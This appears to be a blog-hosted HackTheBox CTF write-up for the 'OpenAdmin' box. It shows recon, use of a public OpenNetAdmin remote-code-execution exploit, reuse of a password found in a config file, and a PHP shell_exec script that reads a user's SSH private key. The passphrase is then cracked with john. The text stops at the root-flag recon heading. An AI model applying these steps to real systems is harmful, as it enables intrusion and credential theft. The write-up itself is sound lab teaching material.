@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>OpenAdmin - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Table of contents    User Flag  Recon Pivot www-data -&amp;gt; jimmy Pivot jimmy -&amp;gt; joanna   Root Flag  Recon Exploit nano SUID      OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn&amp;rsquo;t recommend it for beginners since it require a lot a recon, it&amp;rsquo;s easy to miss important information and can be very frustrating if you are not used to it."/>
+<meta name="keywords" content="hackthebox, ctf, openadmin, opennetadmin, exploit, php, shell_exec, apache, ssh, john, sudo, gtfobins"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/openadmin/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="OpenAdmin - HackTheBox"/>
+<meta name="twitter:description" content="OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn&#39;t recommend it for beginners since it require a lot a recon, it&#39;s easy to miss important information and can be very frustrating if you are not used to it.
+
+**Tl;Dr:** To get the user flag you had to exploit a Remote Code Execution exploit on an outdated `opennetadmin` instance. You get a shell as `www-data` from which you pivot to the `jimmy` user after finding his password in a database config file. From `jimmy` account you pivot again to `joanna` account by extracting her ssh private key using a php script since the Apache web server is configured to run as user `joanna` and we have write rights over the `Document Root` folder. Finally as `joanna` we can get the user flag.  
+The root flag was a bit less tricky and needed you to execute a shell from inside a privileged `nano` that `joanna` is allowed to run as `root` without password.
+
+Alright, let&#39;s get into it!
+"/>
+
+
+
+<meta property="og:title" content="OpenAdmin - HackTheBox" />
+<meta property="og:description" content="OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn&#39;t recommend it for beginners since it require a lot a recon, it&#39;s easy to miss important information and can be very frustrating if you are not used to it.
+
+**Tl;Dr:** To get the user flag you had to exploit a Remote Code Execution exploit on an outdated `opennetadmin` instance. You get a shell as `www-data` from which you pivot to the `jimmy` user after finding his password in a database config file. From `jimmy` account you pivot again to `joanna` account by extracting her ssh private key using a php script since the Apache web server is configured to run as user `joanna` and we have write rights over the `Document Root` folder. Finally as `joanna` we can get the user flag.  
+The root flag was a bit less tricky and needed you to execute a shell from inside a privileged `nano` that `joanna` is allowed to run as `root` without password.
+
+Alright, let&#39;s get into it!
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/openadmin/" />
+<meta property="article:published_time" content="2020-01-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-01-24T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        
+<nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+    <li>
+<a href="/search" title="Search">
+<img src="/icon/search.svg" alt="search" height="20">
+</a>
+<li>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/openadmin/">OpenAdmin - HackTheBox</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-01-24
+        </span>
+
+        
+          
+        
+      
+
+      <span class="post-author">— Written by hg8</span>
+      
+        <span class="post-read-time">— 9 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+          #<a href="/tags/ctf/">ctf</a>&nbsp;
+        
+          #<a href="/tags/openadmin/">openadmin</a>&nbsp;
+        
+          #<a href="/tags/opennetadmin/">opennetadmin</a>&nbsp;
+        
+          #<a href="/tags/exploit/">exploit</a>&nbsp;
+        
+          #<a href="/tags/php/">php</a>&nbsp;
+        
+          #<a href="/tags/shell_exec/">shell_exec</a>&nbsp;
+        
+          #<a href="/tags/apache/">apache</a>&nbsp;
+        
+          #<a href="/tags/ssh/">ssh</a>&nbsp;
+        
+          #<a href="/tags/john/">john</a>&nbsp;
+        
+          #<a href="/tags/sudo/">sudo</a>&nbsp;
+        
+          #<a href="/tags/gtfobins/">gtfobins</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/openadmin-hackthebox.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <hr>
+<details open class="entry-toc">
+  <summary>
+    <span>
+        <b>Table of contents</b>
+    </span>
+  </summary>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#user-flag">User Flag</a>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#pivot-www-data---jimmy">Pivot www-data -&gt; jimmy</a></li>
+        <li><a href="#pivot-jimmy---joanna">Pivot jimmy -&gt; joanna</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-flag">Root Flag</a>
+      <ul>
+        <li><a href="#recon-1">Recon</a></li>
+        <li><a href="#exploit-nano-suid">Exploit nano SUID</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</details>
+
+<p>OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn&rsquo;t recommend it for beginners since it require a lot a recon, it&rsquo;s easy to miss important information and can be very frustrating if you are not used to it.</p>
+<p><strong>Tl;Dr:</strong> To get the user flag you had to exploit a Remote Code Execution exploit on an outdated <code>opennetadmin</code> instance. You get a shell as <code>www-data</code> from which you pivot to the <code>jimmy</code> user after finding his password in a database config file. From <code>jimmy</code> account you pivot again to <code>joanna</code> account by extracting her ssh private key using a php script since the Apache web server is configured to run as user <code>joanna</code> and we have write rights over the <code>Document Root</code> folder. Finally as <code>joanna</code> we can get the user flag.<br>
+The root flag was a bit less tricky and needed you to execute a shell from inside a privileged <code>nano</code>  that <code>joanna</code> is allowed to run as <code>root</code> without password.</p>
+<p>Alright, let&rsquo;s get into it!</p>
+<hr>
+<p>First thing first, let&rsquo;s add the box IP to the host file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.171 openadmin.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>and let&rsquo;s start!</p>
+<h2 id="user-flag">User Flag</h2>
+<h3 id="recon">Recon</h3>
+<p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC openadmin.htb
+Nmap scan report <span style="color:#66d9ef">for</span> openadmin.htb <span style="color:#f92672">(</span>10.10.10.171<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.03 seconds
+</code></pre></div><p>We have the &ldquo;classic&rdquo;: A web app running on port 80 and the SSH port 22 open.</p>
+<p>Opening <code>http://openadmin.htb/</code> display the Apache2 Ubuntu default page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/73017278-cd731100-3e1f-11ea-9b01-c07b9d816af3.png" alt="Apache2 Ubuntu default page"></p>
+<p>Nothing really interesting to see here&hellip; Let&rsquo;s open  <code>gobuster</code> to see if he can find some juicy files and folders:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ gobuster dir -u <span style="color:#e6db74">&#34;http://openadmin.htb/&#34;</span> -w ~/SecLists/Discovery/Web-Content/big.txt 
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/artwork <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/music <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/sierra <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+2020/01/23 11:25:48 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p>Three uncommon folder here:</p>
+<ul>
+<li>
+<p><code>artwork</code> and <code>sierra</code> are just static demo website, nothing to do on it.</p>
+</li>
+<li>
+<p><code>music</code> looks like this:</p>
+</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/9076747/73017609-6efa6280-3e20-11ea-9f62-3d00bd0d24a9.png" alt="music website hackthebox"></p>
+<p>Oddly enough the <code>Login</code> button redirect to an admin interface:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/73017790-ac5ef000-3e20-11ea-9efa-0c4587673e66.png" alt="open admin page"></p>
+<p>First thing that catch the eye is this big yellow message:</p>
+<blockquote>
+<p>You are NOT on the latest release version<br>
+Your version    = v18.1.1<br>
+Latest version = Unable to determine</p>
+<p>Please DOWNLOAD the latest version.</p>
+</blockquote>
+<p>We all know what outdated software means right :D</p>
+<p>Selecting the &ldquo;DOWNLOAD&rdquo; link redirect to the software page which is called&hellip;. <code>OpenNetAdmin</code>. At first I though the name of the box would be related to a admin page being open and easily accessible but turn out it was more a reference to the software used.</p>
+<p>We have the name of the software and it&rsquo;s version (which is outdated). Let&rsquo;s see if some already made exploits are available:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ searchsploit opennetadmin
+------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                               |  Path
+                                                             | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
+------------------------------------------------------------- ----------------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits/php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span> | exploits/php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits/php/webapps/47691.sh
+------------------------------------------------------------- ----------------------------------------
+</code></pre></div><p>Bingo! Remote code execution on the exact version running here. Should be easy right?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ wget https://www.exploit-db.com/raw/47691 -o opennetadmin-rce.sh
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ bash exploit.sh http://openadmin.htb/ona/
+&gt; id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</code></pre></div><p>We got a shell as <code>www-data</code>.</p>
+<h3 id="pivot-www-data---jimmy">Pivot www-data -&gt; jimmy</h3>
+<p>Let&rsquo;s start by enumerating users:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@openadmin:/$ ls -lh /home/
+total 8.0K
+drwxr-x--- <span style="color:#ae81ff">5</span> jimmy  jimmy  4.0K Jan <span style="color:#ae81ff">24</span> 02:10 jimmy
+drwxr-x--- <span style="color:#ae81ff">6</span> joanna joanna 4.0K Nov <span style="color:#ae81ff">28</span> 09:37 joanna
+</code></pre></div><p>Two users, we don&rsquo;t have enough rights to access neither of their home folder. Let&rsquo;s continue our enumerations.</p>
+<p>One thing that often gives good results on web applications is searching for hard-coded password. A little grep can do that for us:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@openadmin:/$ grep -ri pass .
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+./local/config/database_settings.inc.php: <span style="color:#e6db74">&#39;db_passwd&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;n1nj4W4rri0R!&#39;</span>,
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>Here is something interesting! The full config file is the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+
+$ona_contexts<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span> (
+  <span style="color:#e6db74">&#39;DEFAULT&#39;</span> <span style="color:#f92672">=&gt;</span>
+  <span style="color:#66d9ef">array</span> (
+    <span style="color:#e6db74">&#39;databases&#39;</span> <span style="color:#f92672">=&gt;</span>
+    <span style="color:#66d9ef">array</span> (
+      <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span>
+      <span style="color:#66d9ef">array</span> (
+        <span style="color:#e6db74">&#39;db_type&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>,
+        <span style="color:#e6db74">&#39;db_host&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
+        <span style="color:#e6db74">&#39;db_login&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;ona_sys&#39;</span>,
+        <span style="color:#e6db74">&#39;db_passwd&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;n1nj4W4rri0R!&#39;</span>,
+        <span style="color:#e6db74">&#39;db_database&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;ona_default&#39;</span>,
+        <span style="color:#e6db74">&#39;db_debug&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+      ),
+    ),
+    <span style="color:#e6db74">&#39;description&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Default data context&#39;</span>,
+    <span style="color:#e6db74">&#39;context_color&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;#D3DBFF&#39;</span>,
+  ),
+);
+</code></pre></div><p>Let&rsquo;s see if this password can work for either <code>jimmy</code> or <code>joanna</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh joanna@openadmin.htb
+joanna@openadmin.htb<span style="color:#e6db74">&#39;s password:
+</span><span style="color:#e6db74">Permission denied, please try again.
+</span><span style="color:#e6db74">joanna@openadmin.htb&#39;</span>s password:
+
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh jimmy@openadmin.htb
+jimmy@openadmin.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Welcome to Ubuntu 18.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-70-generic x86_64<span style="color:#f92672">)</span>
+
+Last login: Fri Jan <span style="color:#ae81ff">24</span> 01:52:49 <span style="color:#ae81ff">2020</span> from 10.10.14.43
+jimmy@openadmin:~$ ls
+jimmy@openadmin:~$
+</code></pre></div><p>It works with <code>jimmy</code>! Unfortunately there is no user flags here, but at least we get a stable shell.</p>
+<h3 id="pivot-jimmy---joanna">Pivot jimmy -&gt; joanna</h3>
+<p>Since we got database access I went to check if we could find juicy informations and potential other users password hash in the database:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ mysql -u ona_sys -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
+Server version: 5.7.28-0ubuntu0.18.04.4 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+
+mysql&gt; SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ona_default        |
++--------------------+
+<span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+
+mysql&gt; USE ona_default;
+Database changed
+mysql&gt; SHOW TABLES;
++------------------------+
+| Tables_in_ona_default  |
++------------------------+
+| <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>                  |
+| users                  |
+| <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>                  |
++------------------------+
+<span style="color:#ae81ff">40</span> rows in set <span style="color:#f92672">(</span>0.01 sec<span style="color:#f92672">)</span>
+
+mysql&gt; SELECT * FROM users;
++----+----------+----------------------------------+-------+---------------------+---------------------+
+| id | username | password                         | level | ctime               | atime               |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+|  <span style="color:#ae81ff">1</span> | guest    | 098f6bcd4621d373cade4e832627b4f6 |     <span style="color:#ae81ff">0</span> | 2020-01-23 10:12:57 | 2020-01-23 10:12:57 |
+|  <span style="color:#ae81ff">2</span> | admin    | 21232f297a57a5a743894a0e4a801fc3 |     <span style="color:#ae81ff">0</span> | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+<span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+</code></pre></div><p>Two MD5 hash. Quick Google search shows that <code>098f6bcd4621d373cade4e832627b4f6</code> is hash for <code>test</code> and <code>21232f297a57a5a743894a0e4a801fc3</code> is hash for <code>admin</code>.</p>
+<p>Too bad no hash for <code>joanna</code> here. Let&rsquo;s move on to more recon.</p>
+<p>While looking around (still using the awesome <code>grep</code>) we find some interesting config files mentioning <code>joanna</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:/etc$ grep -ri <span style="color:#e6db74">&#34;joanna&#34;</span> . 2&gt;/dev/null
+./passwd-:joanna:x:1001:1001::/home/joanna:/bin/bash
+./apache2/sites-available/internal.conf:AssignUserID joanna joanna
+./sudoers.d/joanna:joanna ALL<span style="color:#f92672">=(</span>ALL<span style="color:#f92672">)</span> NOPASSWD:/bin/nano /opt/priv
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>The <code>sudoers.d</code> one look perfect for a privilege escalation don&rsquo;t you think ? Let&rsquo;s keep this in mind for later. The one that really catch my eye is the apache config. Let&rsquo;s see the full file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apacheconf" data-lang="apacheconf">Listen <span style="color:#ae81ff">127.0.0.1</span>:52846
+
+<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#e6db74">127.0.0.1:52846</span><span style="color:#f92672">&gt;</span>
+    ServerName internal.openadmin.htb
+    DocumentRoot <span style="color:#e6db74">/var/www/internal</span>
+
+<span style="color:#f92672">&lt;IfModule</span> <span style="color:#e6db74">mpm_itk_module</span><span style="color:#f92672">&gt;</span>
+AssignUserID joanna joanna
+<span style="color:#f92672">&lt;/IfModule&gt;</span>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
+</code></pre></div><p>It was the first time I saw about the <code>AssignUserID</code> configuration. Even if we can easily understand that it&rsquo;s meant to run the apache process for this virtualhost as <code>joanna</code> instead of <code>www-data</code> I searched on the documentation out of curiosity to learn more about this.</p>
+<p>This configuration is available through the <a href="http://mpm-itk.sesse.net/"><code>apache2-mpm-itk</code></a> module:</p>
+<blockquote>
+<p><code>AssignUserID</code>: Takes two parameters, uid and gid (or
+really, user name and group name; use “#<!-- raw HTML omitted -->” if you want to
+specify a raw uid); specifies what uid and gid the
+vhost will run as (after parsing the request etc., of course).</p>
+</blockquote>
+<p>So, the virtualhost for <code>/var/www/internal</code> document root runs as <code>joanna</code>. If we can find a Remote Code Execution command in the PHP code in this folder (by abusing an <code>eval</code> or uploading web shell for example), then we can run commands as <code>joanna</code> user.</p>
+<p>To be honest, I missed this folder in my previous recons, so let&rsquo;s see what&rsquo;s inside now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">jimmy@openadmin:/$ ls -l /var/www/
+drwxr-xr-x 6 www-data www-data 4096 Nov 22 15:59 html
+drwxrwx--- 2 jimmy    internal 4096 Jan 24 03:11 internal
+jimmy@openadmin:/var/www/internal$ ls -l
+-rwxrwxr-x 1 jimmy internal 3228 Jan 24 03:11 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
+</code></pre></div><p>Here is something interesting&hellip; The <code>internal</code> folder is owned by our current <code>jimmy</code>, meaning we can write anything we want in this folder. I will use use the <code>shell_exec()</code> php function to try to retrieve <code>joanna</code> ssh private key.</p>
+<p>Here is one way to do it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
+<span style="color:#66d9ef">echo</span> $output;
+</code></pre></div><p>Now let&rsquo;s run it! (Remember apache listen on port <code>52846</code> for this virutalhost as we can see in the <code>internal.conf</code> config file)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:/$ curl 127.0.0.1:52846/hg8.php
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+</code></pre></div><p>Bingo!</p>
+<p><em>Note: Don&rsquo;t forget to remove your php file to not spoil users after you ;)</em></p>
+<p>We can now use <code>joanna</code> ssh private key to login to her account:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i joanna_id_rsa joanna@openadmin.htb
+Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;joanna_id_rsa&#39;</span>:
+</code></pre></div><p>No luck! Passphrase is needed. From here we have two choices:</p>
+<ol>
+<li>
+<p>Either we go back to our php script and edit it to open a reverse shell instead of grabbing the private key.</p>
+</li>
+<li>
+<p>We try to brute-force <code>joanna</code> private key passphrase.</p>
+</li>
+</ol>
+<p>I think it would be more interesting to show how to brute-force the hash, if we fail we can still go back to open a simple reserve shell.</p>
+<p>I will use <code>john</code> to bruteforce the ssh key passphrase:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh2john joanna_id_rsa &gt; id_rsa.hash
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH <span style="color:#f92672">(</span>SSH private keys<span style="color:#f92672">)</span> 32/64<span style="color:#f92672">])</span>
+bloodninjas      <span style="color:#f92672">(</span>joanna_id_rsa<span style="color:#f92672">)</span>
+1g 0:00:00:14 DONE <span style="color:#f92672">(</span>2020-01-24 17:05<span style="color:#f92672">)</span> 0.07062g/s 1012Kp/s 1012Kc/s 1012KC/s *7¡Vamos!
+Session completed
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --show id_rsa.hash
+joanna_id_rsa:bloodninjas
+</code></pre></div><p>Great we got it, and it&rsquo;s related to ninja again. Let&rsquo;s grab our flag now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i joanna_id_rsa joanna@openadmin.htb
+Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;joanna_id_rsa&#39;</span>:
+
+Welcome to Ubuntu 18.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-70-generic x86_64<span style="color:#f92672">)</span>
+
+Last login: Thu Jan  <span style="color:#ae81ff">2</span> 21:12:40 <span style="color:#ae81ff">2020</span> from 10.10.14.3
+joanna@openadmin:~$ cat user.txt
+cxxxxxxxxxxxxxxxxxxxxxxxxxxf
+</code></pre></div><h2 id="root-flag">Root Flag</h2>
+<h3 id="recon-1">Recon</h3>
